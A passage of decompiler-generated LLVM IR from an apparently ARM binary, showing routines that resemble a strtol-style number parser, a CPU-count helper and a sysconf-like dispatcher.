  %v2_124bc = add i32 %v2_124b8, %v4_124b4
  %v3_124bc = inttoptr i32 %v2_124bc to i16*
  %v4_124bc = load i16, i16* %v3_124bc, align 2
  %v1_124c0 = and i16 %v4_124bc, 32
  %v2_124c0 = icmp eq i16 %v1_124c0, 0
  br i1 %v2_124c0, label %dec_label_pc_124c8, label %dec_label_pc_124ac

dec_label_pc_124c8:                               ; preds = %dec_label_pc_124b0
  %v7_124c8 = icmp eq i8 %v2_124b0, 43
  br i1 %v7_124c8, label %dec_label_pc_124e8, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124c8
  %v7_124d0 = icmp eq i8 %v2_124b0, 45
  br i1 %v7_124d0, label %dec_label_pc_124e8, label %bb

bb:                                               ; preds = %dec_label_pc_124d0
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_124ec

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124c8, %dec_label_pc_124d0
  %storemerge39 = phi i32 [ 1, %dec_label_pc_124d0 ], [ 0, %dec_label_pc_124c8 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_124e8 = add i32 %v0_124e8, 1
  store i32 %v1_124e8, i32* @r4, align 4
  br label %dec_label_pc_124ec

dec_label_pc_124ec:                               ; preds = %bb, %dec_label_pc_124e8
  %v0_1250c = phi i32 [ %v0_124e8, %bb ], [ %v1_124e8, %dec_label_pc_124e8 ]
  %v1_124ec = and i32 %v0_1249c, -17
  %v3_124ec = icmp eq i32 %v1_124ec, 0
  br i1 %v3_124ec, label %dec_label_pc_124f8, label %bb52

bb52:                                             ; preds = %dec_label_pc_124ec
  store i32 %v0_124a0, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124ec
  %v1_124f8 = inttoptr i32 %v0_1250c to i8*
  %v2_124f8 = load i8, i8* %v1_124f8, align 1
  %v7_124fc = icmp eq i8 %v2_124f8, 48
  %v1_12500 = add i32 %v0_1249c, 10
  store i32 %v1_12500, i32* %r5.global-to-local, align 4
  br i1 %v7_124fc, label %dec_label_pc_1250c, label %bb53

bb53:                                             ; preds = %dec_label_pc_124f8
  store i32 %v0_124a0, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_1250c:                               ; preds = %dec_label_pc_124f8
  %v1_1250c = add i32 %v0_1250c, 1
  %v2_1250c = inttoptr i32 %v1_1250c to i8*
  %v3_1250c = load i8, i8* %v2_1250c, align 1
  %v4_1250c = zext i8 %v3_1250c to i32
  store i32 %v1_1250c, i32* @r4, align 4
  %v1_12510 = or i32 %v4_1250c, 32
  %v7_12514 = icmp eq i32 %v1_12510, 120
  %v1_12518 = add i32 %v0_1249c, 8
  store i32 %v1_12518, i32* %r5.global-to-local, align 4
  store i32 %v1_1250c, i32* %r6.global-to-local, align 4
  br i1 %v7_12514, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_1250c
  %v3_12524 = mul i32 %v1_12518, 2
  store i32 %v3_12524, i32* %r5.global-to-local, align 4
  %v2_12528 = add i32 %v0_1250c, 2
  store i32 %v2_12528, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1250c, %bb53, %bb54
  %v0_1252c = phi i32 [ %v1_12500, %bb53 ], [ %v3_12524, %bb54 ], [ %v1_12518, %dec_label_pc_1250c ]
  %v5_12530 = icmp slt i32 %v0_1252c, 16
  br i1 %v5_12530, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_12548 = phi i32 [ %v0_1249c, %bb52 ], [ %v0_1252c, %.thread8 ], [ 16, %bb55 ]
  %v1_12534 = add i32 %v0_12548, -2
  %tmp = icmp ugt i32 %v1_12534, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12544

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_125f0

dec_label_pc_12544:                               ; preds = %bb56
  %v2_1254c = call i32 @function_10028(i32 -1, i32 %v0_12548)
  store i32 -1, i32* @r0, align 4
  %v0_12558 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12558, i32* @r1, align 4
  %v1_1255c = urem i32 %v0_12548, 256
  store i32 %v1_1255c, i32* %sl.global-to-local, align 4
  %v0_12560 = call i32 @function_ff2c()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_12560, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_12578.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12578

dec_label_pc_12574:                               ; preds = %bb63, %dec_label_pc_125d4
  %v0_12574 = phi i32 [ %v1_125b436, %bb63 ], [ %v0_12574.pre, %dec_label_pc_125d4 ]
  store i32 %v0_12574, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12578

dec_label_pc_12578:                               ; preds = %dec_label_pc_12544, %dec_label_pc_12574
  %v0_125b4 = phi i32 [ %v0_12578.pre, %dec_label_pc_12544 ], [ %v0_12574, %dec_label_pc_12574 ]
  %v1_12578 = inttoptr i32 %v0_125b4 to i8*
  %v2_12578 = load i8, i8* %v1_12578, align 1
  %v3_12578 = zext i8 %v2_12578 to i32
  %v1_1257c = add nsw i32 %v3_12578, -48
  %v1_12580 = urem i32 %v1_1257c, 256
  %v1_12588 = or i32 %v3_12578, 32
  %tmp71 = icmp ult i32 %v1_12580, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_12590

dec_label_pc_12590:                               ; preds = %dec_label_pc_12578
  %tmp72 = icmp ugt i32 %v1_12588, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_12590
  %v1_12594 = add nsw i32 %v1_12588, -87
  %v5_1259c = urem i32 %v1_12594, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_12578, %dec_label_pc_12590, %bb57
  %v3_125cc = phi i32 [ %v1_12580, %dec_label_pc_12578 ], [ 40, %dec_label_pc_12590 ], [ %v5_1259c, %bb57 ]
  %v1_125a0 = load i32, i32* %r5.global-to-local, align 4
  %v6_125a4 = icmp slt i32 %v3_125cc, %v1_125a0
  br i1 %v6_125a4, label %dec_label_pc_125a8, label %dec_label_pc_125f0.loopexit

dec_label_pc_125a8:                               ; preds = %bb58
  %v0_125a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_125a8 = load i32, i32* %r8.global-to-local, align 4
  %v9_125a8 = icmp eq i32 %v0_125a8, %v1_125a8
  br i1 %v9_125a8, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_125a8
  %v1_125b432 = add i32 %v0_125b4, 1
  store i32 %v1_125b432, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_125bc

bb59:                                             ; preds = %dec_label_pc_125a8
  %v3_125a8 = icmp ult i32 %v0_125a8, %v1_125a8
  %v1_125b4 = add i32 %v0_125b4, 1
  store i32 %v1_125b4, i32* %r4.global-to-local, align 4
  br i1 %v3_125a8, label %dec_label_pc_125bc, label %dec_label_pc_125d4

dec_label_pc_125bc:                               ; preds = %bb59, %.thread31
  %v1_125b436 = phi i32 [ %v1_125b432, %.thread31 ], [ %v1_125b4, %bb59 ]
  %v4_125c42235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_125bc = load i32, i32* %sl.global-to-local, align 4
  %v3_125bc = icmp uge i32 %v3_125cc, %v1_125bc
  %v9_125bc = icmp eq i32 %v3_125cc, %v1_125bc
  %v2_125c0 = xor i1 %v3_125bc, true
  %v3_125c0 = or i1 %v9_125bc, %v2_125c0
  br i1 %v3_125c0, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_125bc
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_125bc, %bb60
  %v4_125c4 = phi i32 [ %v4_125c42235, %dec_label_pc_125bc ], [ 0, %bb60 ]
  %v2_125c4 = xor i1 %v9_125bc, true
  %v3_125c4 = and i1 %v3_125bc, %v2_125c4
  br i1 %v3_125c4, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_125c4 = urem i32 %v4_125c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_125c8 = phi i32 [ %v5_125c4, %bb62 ], [ %v4_125c4, %bb61 ]
  %v2_125c8 = icmp eq i32 %v0_125c8, 0
  br i1 %v2_125c8, label %bb63, label %dec_label_pc_125d4

bb63:                                             ; preds = %thread-pre-split
  %v4_125cc = mul i32 %v0_125a8, %v1_125a0
  %v5_125cc = add i32 %v4_125cc, %v3_125cc
  store i32 %v5_125cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12574

dec_label_pc_125d4:                               ; preds = %bb59, %thread-pre-split
  %v0_125d4 = call i32 @function_10a30()
  %v0_125dc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_125dc, i32* %ip.global-to-local, align 4
  %v0_125e0 = load i32, i32* @r7, align 4
  %v2_125e0 = and i32 %v0_125e0, %v0_124a4
  store i32 %v2_125e0, i32* @r7, align 4
  %v2_125e8 = inttoptr i32 %v0_125d4 to i32*
  store i32 34, i32* %v2_125e8, align 4
  %v0_12574.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12574

dec_label_pc_125f0.loopexit:                      ; preds = %bb58
  %v0_125f0.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_125f0

dec_label_pc_125f0:                               ; preds = %.thread, %dec_label_pc_125f0.loopexit
  %v2_125f4 = phi i32 [ %v0_125f0.pre, %dec_label_pc_125f0.loopexit ], [ %v0_12498, %.thread ]
  %v2_125f0 = icmp eq i32 %v2_125f4, 0
  br i1 %v2_125f0, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_125f0
  %v1_125f4 = load i32, i32* %r6.global-to-local, align 4
  %v3_125f4 = inttoptr i32 %v2_125f4 to i32*
  store i32 %v1_125f4, i32* %v3_125f4, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_125f0, %bb64
  %v0_125fc = load i32, i32* @r7, align 4
  %v2_125fc = icmp eq i32 %v0_125fc, 0
  %. = select i1 %v2_125fc, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_12608 = icmp eq i32 %v0_124a4, 0
  %v0_1262c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12608, label %dec_label_pc_12624, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_1262c.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_12614, label %dec_label_pc_12624

dec_label_pc_12614:                               ; preds = %bb68
  %v0_12614 = call i32 @function_10a30()
  %v2_1261c = inttoptr i32 %v0_12614 to i32*
  store i32 34, i32* %v2_1261c, align 4
  %v0_12620 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12620, i32* %ip.global-to-local, align 4
  %v0_12624.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %bb68, %bb65, %dec_label_pc_12614
  %v0_1262c.pre = phi i32 [ %v0_1262c.pre.pre, %bb68 ], [ %v0_12620, %dec_label_pc_12614 ], [ %v0_1262c.pre.pre, %bb65 ]
  %v0_12624 = phi i32 [ %v0_125fc, %bb68 ], [ %v0_12624.pre, %dec_label_pc_12614 ], [ %v0_125fc, %bb65 ]
  %v2_12624 = icmp eq i32 %v0_12624, 0
  br i1 %v2_12624, label %dec_label_pc_12624._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_12624
  %v2_12628 = sub i32 0, %v0_1262c.pre
  store i32 %v2_12628, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12624._crit_edge

dec_label_pc_12624._crit_edge:                    ; preds = %dec_label_pc_12624, %bb69
  %v0_1262c = phi i32 [ %v2_12628, %bb69 ], [ %v0_1262c.pre, %dec_label_pc_12624 ]
  store i32 %v3_12484, i32* @r4, align 4
  ret i32 %v0_1262c

; uselistorder directives
  uselistorder i32 %v0_1262c.pre, { 1, 0 }
  uselistorder i32 %v0_1262c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_125c4, { 1, 0 }
  uselistorder i1 %v3_125bc, { 1, 0 }
  uselistorder i32 %v1_125bc, { 1, 0 }
  uselistorder i32 %v1_12588, { 1, 0 }
  uselistorder i32 %v1_12580, { 1, 0 }
  uselistorder i32 %v0_125b4, { 1, 0, 2 }
  uselistorder i32 %v0_12574, { 1, 0 }
  uselistorder i32 %v3_12524, { 1, 0 }
  uselistorder i32 %v1_12518, { 1, 0, 2 }
  uselistorder i32 %v0_124e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_124a4, { 1, 0 }
  uselistorder i32 %v0_1249c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 ()* @function_ff2c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_10028, { 2, 1, 0, 3 }
  uselistorder i32 34, { 1, 2, 0, 4, 8, 3, 9, 5, 10, 6, 11, 7, 12 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12624._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12624, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_125f0, { 1, 0 }
  uselistorder label %dec_label_pc_125d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12578, { 1, 0 }
  uselistorder label %dec_label_pc_12574, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124ec, { 1, 0 }
  uselistorder label %dec_label_pc_124e8, { 1, 0 }
  uselistorder label %dec_label_pc_124b0, { 1, 0 }
}

define i32 @function_12644(i32 %arg1) local_unnamed_addr {
dec_label_pc_12644:
  %stack_var_-16 = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_bd20.427 to i32), i32 75348), i32* @r5, align 4
  %v4_12650 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_bd20.427 to i32), i32 75436) to i32*), align 4
  store i32 %v4_12650, i32* @r4, align 4
  %v2_12658 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_12670 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_bd20.427 to i32), i32 75420) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12670)
  %v0_12684 = load i32, i32* @r5, align 4
  %v2_12684 = add i32 %v0_12684, 16
  %v3_12684 = inttoptr i32 %v2_12684 to i32*
  %v4_12684 = load i32, i32* %v3_12684, align 4
  call void @__pseudo_branch(i32 %v4_12684)
  %v4_12694 = load i32, i32* @global_var_1e5d4.433, align 4
  %v2_12698 = icmp eq i32 %v4_12694, 0
  br i1 %v2_12698, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12644
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12644, %bb
  %v2_126a4 = xor i1 %v2_12698, true
  call void @__pseudo_cond_branch(i1 %v2_126a4, i32 %v4_12694)
  store i32 %v2_12658, i32* @r0, align 4
  %v0_126b4 = load i32, i32* @r5, align 4
  %v2_126b4 = add i32 %v0_126b4, 24
  %v3_126b4 = inttoptr i32 %v2_126b4 to i32*
  %v4_126b4 = load i32, i32* %v3_126b4, align 4
  call void @__pseudo_branch(i32 %v4_126b4)
  %v0_126c0 = call i32 @function_12f10()
  %v0_126c8 = load i32, i32* @r5, align 4
  %v9_126c8 = icmp eq i32 %v0_126c8, 40904
  br i1 %v9_126c8, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_126d0 = xor i1 %v9_126c8, true
  call void @__pseudo_cond_branch(i1 %v2_126d0, i32 ptrtoint (i32* @global_var_143ac.436 to i32))
  %v0_126d4 = load i32, i32* @r6, align 4
  %v1_126d8 = call i32 @function_13978(i32 %v0_126d4)
  %v0_126dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_126dc, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_126f4 = phi i32 [ %v1_126d8, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_126f4

; uselistorder directives
  uselistorder i1 %v9_126c8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_126fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_126fc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_126fc = load i32, i32* @r4, align 4
  %v6_126fc = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_12700 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_12700, label %dec_label_pc_12794, label %dec_label_pc_12710

dec_label_pc_12710:                               ; preds = %dec_label_pc_126fc
  %v2_12720 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_12734 = call i32 @function_13388(i32 17, i32 0, i32 %v2_12720)
  %v3_12738 = load i32, i32* %stack_var_-44, align 4
  %v7_1273c = icmp eq i32 %v3_12738, 1
  br i1 %v7_1273c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12710
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12710, %bb
  call void @__pseudo_cond_branch(i1 %v7_1273c, i32 ptrtoint (i32* @global_var_105d0.438 to i32))
  %v2_12750 = ptrtoint i32* %stack_var_-16 to i32
  %v2_12758 = call i32 @function_138bc(i32 %v2_12750, i32 %v2_12750)
  %v2_1275c = icmp eq i32 %v2_12758, 0
  br i1 %v2_1275c, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_12770 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_12770, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_12780 = load i32, i32* %stack_var_-24, align 4
  %v1_12784 = and i32 %v3_12780, 65536
  %v2_12784 = icmp eq i32 %v1_12784, 0
  br i1 %v2_12784, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_12784, i32 ptrtoint (i32* @global_var_105d0.438 to i32))
  %v0_12794.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_126fc, %.thread6
  %v0_12794 = phi i32 [ %v0_12794.pre, %.thread6 ], [ 0, %dec_label_pc_126fc ]
  store i32 %v3_126fc, i32* @r4, align 4
  store i32 %v6_126fc, i32* @lr, align 4
  ret i32 %v0_12794

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_13388, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12794, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_127a8() local_unnamed_addr {
dec_label_pc_127a8:
  %stack_var_-36 = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_bbb8.441 to i32), i32 75708), i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_15ffc.443 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_127c8 = call i32 @function_13dec(i32 ptrtoint ([11 x i8]* @global_var_15ffc.443 to i32))
  store i32 %v2_127c8, i32* @r6, align 4
  %v2_127cc = icmp eq i32 %v2_127c8, 0
  br i1 %v2_127cc, label %dec_label_pc_1284c, label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127a8
  store i32 224, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_159b4.24 to i32), i32* @r8, align 4
  %v2_127e0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_127e0, i32* @r7, align 4
  br label %bb18

dec_label_pc_127e8:                               ; preds = %bb18
  %v3_127e8 = load i32, i32* %stack_var_-36, align 4
  %v1_127ec = inttoptr i32 %v3_127e8 to i32*
  %v2_127ec = load i32, i32* %v1_127ec, align 4
  %v1_127f0 = inttoptr i32 %v2_127ec to i8*
  %v2_127f0 = load i8, i8* %v1_127f0, align 1
  %v7_127f4 = icmp eq i8 %v2_127f0, 99
  br i1 %v7_127f4, label %dec_label_pc_127fc, label %.backedge3

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127e8
  %v1_127fc = add i32 %v2_127ec, 1
  %v2_127fc = inttoptr i32 %v1_127fc to i8*
  %v3_127fc = load i8, i8* %v2_127fc, align 1
  %v7_12800 = icmp eq i8 %v3_127fc, 112
  br i1 %v7_12800, label %dec_label_pc_12808, label %.backedge3

dec_label_pc_12808:                               ; preds = %dec_label_pc_127fc
  %v1_12808 = add i32 %v2_127ec, 2
  %v2_12808 = inttoptr i32 %v1_12808 to i8*
  %v3_12808 = load i8, i8* %v2_12808, align 1
  %v7_1280c = icmp eq i8 %v3_12808, 117
  br i1 %v7_1280c, label %dec_label_pc_12814, label %.backedge3

dec_label_pc_12814:                               ; preds = %dec_label_pc_12808
  %v1_12814 = add i32 %v2_127ec, 3
  %v2_12814 = inttoptr i32 %v1_12814 to i8*
  %v3_12814 = load i8, i8* %v2_12814, align 1
  %v4_12814 = zext i8 %v3_12814 to i32
  %v0_12818 = load i32, i32* @r4, align 4
  %v1_12818 = load i32, i32* @sl, align 4
  %v2_12818 = add i32 %v1_12818, %v0_12818
  %v3_12818 = inttoptr i32 %v2_12818 to i32*
  %v4_12818 = load i32, i32* %v3_12818, align 4
  %v2_1281c = mul nuw nsw i32 %v4_12814, 2
  %v2_12820 = add i32 %v4_12818, %v2_1281c
  %v3_12820 = inttoptr i32 %v2_12820 to i16*
  %v4_12820 = load i16, i16* %v3_12820, align 2
  %v1_12824 = and i16 %v4_12820, 8
  %v2_12824 = icmp eq i16 %v1_12824, 0
  br i1 %v2_12824, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_12814
  %v1_12828 = load i32, i32* @r5, align 4
  %v2_12828 = add i32 %v1_12828, 1
  store i32 %v2_12828, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_12814, %dec_label_pc_127e8, %dec_label_pc_127fc, %dec_label_pc_12808
  %v0_1282c.pre = load i32, i32* @r6, align 4
  %v0_12838.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_127d4
  %v0_12838 = phi i32 [ %v0_12838.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_159b4.24 to i32), %dec_label_pc_127d4 ]
  %v0_1282c = phi i32 [ %v0_1282c.pre, %.backedge3 ], [ %v2_127c8, %dec_label_pc_127d4 ]
  %v4_1283c = inttoptr i32 %v0_1282c to i32*
  %v5_1283c = call i32 @function_13a90(i32* %v4_1283c, i32 %v2_127e0, i32 258, i32 %v0_12838)
  %v2_12840 = icmp eq i32 %v5_1283c, 0
  br i1 %v2_12840, label %dec_label_pc_128b0, label %dec_label_pc_127e8

dec_label_pc_1284c:                               ; preds = %dec_label_pc_127a8
  store i32 ptrtoint ([14 x i8]* @global_var_16008.448 to i32), i32* @r0, align 4
  %v2_12854 = call i32 @function_13dec(i32 ptrtoint ([14 x i8]* @global_var_16008.448 to i32))
  store i32 %v2_12854, i32* @r6, align 4
  %v2_12858 = icmp eq i32 %v2_12854, 0
  br i1 %v2_12858, label %bb19, label %dec_label_pc_12864

bb19:                                             ; preds = %dec_label_pc_1284c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_128b0

dec_label_pc_12864:                               ; preds = %dec_label_pc_1284c
  store i32 ptrtoint ([10 x i8]* @global_var_16018.450 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1603c.452 to i32), i32* @r7, align 4
  %v2_12874 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12874, i32* @r4, align 4
  br label %bb21

dec_label_pc_1287c:                               ; preds = %bb21
  %v0_128a8 = load i32, i32* @r8, align 4
  %v1_128a8 = inttoptr i32 %v0_128a8 to i8*
  %v3_1287c = load i32, i32* %stack_var_-36, align 4
  %v1_12880 = inttoptr i32 %v3_1287c to i32*
  %v2_12880 = load i32, i32* %v1_12880, align 4
  store i32 %v2_12880, i32* @r1, align 4
  %v4_12884 = call i32 @function_150a0(i8* %v1_128a8, i32 %v2_12880)
  %v2_12888 = icmp eq i32 %v4_12884, 0
  br i1 %v2_12888, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_1287c
  %v1_1288c = load i32, i32* @r5, align 4
  %v2_1288c = add i32 %v1_1288c, 1
  store i32 %v2_1288c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_1287c
  %v0_12898.pre = load i32, i32* @r7, align 4
  %v0_1289c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_12864
  %v0_1289c = phi i32 [ %v0_1289c.pre, %.backedge ], [ %v2_12854, %dec_label_pc_12864 ]
  %v0_12898 = phi i32 [ %v0_12898.pre, %.backedge ], [ ptrtoint (i32* @global_var_1603c.452 to i32), %dec_label_pc_12864 ]
  %v4_128a0 = inttoptr i32 %v0_1289c to i32*
  %v5_128a0 = call i32 @function_13a90(i32* %v4_128a0, i32 %v2_12874, i32 459266, i32 %v0_12898)
  %v2_128a4 = icmp eq i32 %v5_128a0, 0
  br i1 %v2_128a4, label %dec_label_pc_128b0, label %dec_label_pc_1287c

dec_label_pc_128b0:                               ; preds = %bb18, %bb21, %bb19
  %v0_128b0 = load i32, i32* @r6, align 4
  %v1_128b4 = inttoptr i32 %v0_128b0 to i32*
  %v2_128b4 = call i32 @function_13db8(i32* %v1_128b4)
  %v0_128b8 = load i32, i32* @r5, align 4
  %v2_128b8 = icmp eq i32 %v0_128b8, 0
  %.v0_128b8 = select i1 %v2_128b8, i32 1, i32 %v0_128b8
  ret i32 %.v0_128b8

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_159b4.24 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 (i32)* @function_13dec, { 1, 0 }
  uselistorder label %dec_label_pc_128b0, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_128f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_128f4:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_12cdc

bb:                                               ; preds = %dec_label_pc_128f4
  %v7_12908 = mul i32 %arg1, 4
  %v8_12908 = add i32 %v7_12908, ptrtoint (i32* @global_var_12910.455 to i32)
  call void @__pseudo_branch(i32 %v8_12908)
  br label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %bb, %dec_label_pc_128f4
  %v0_12cdc = call i32 @function_10a30()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12ce8 = inttoptr i32 %v0_12cdc to i32*
  store i32 22, i32* %v2_12ce8, align 4
  %v0_12e98 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_12e98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12f10() local_unnamed_addr {
dec_label_pc_12f34.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12f10 = load i32, i32* @r4, align 4
  store i32 %v3_12f10, i32* %stack_var_-16, align 4
  store i32 123756, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f34.dec_label_pc_12f34_crit_edge, %dec_label_pc_12f34.lr.ph
  %v1_12f34 = phi i32 [ %v1_12f40, %dec_label_pc_12f34.dec_label_pc_12f34_crit_edge ], [ 0, %dec_label_pc_12f34.lr.ph ]
  %v0_12f34 = phi i32 [ %v0_12f34.pre, %dec_label_pc_12f34.dec_label_pc_12f34_crit_edge ], [ 123756, %dec_label_pc_12f34.lr.ph ]
  %v4_12f34 = mul i32 %v1_12f34, 4
  %v5_12f34 = add i32 %v4_12f34, %v0_12f34
  %v6_12f34 = inttoptr i32 %v5_12f34 to i32*
  %v7_12f34 = load i32, i32* %v6_12f34, align 4
  call void @__pseudo_branch(i32 %v7_12f34)
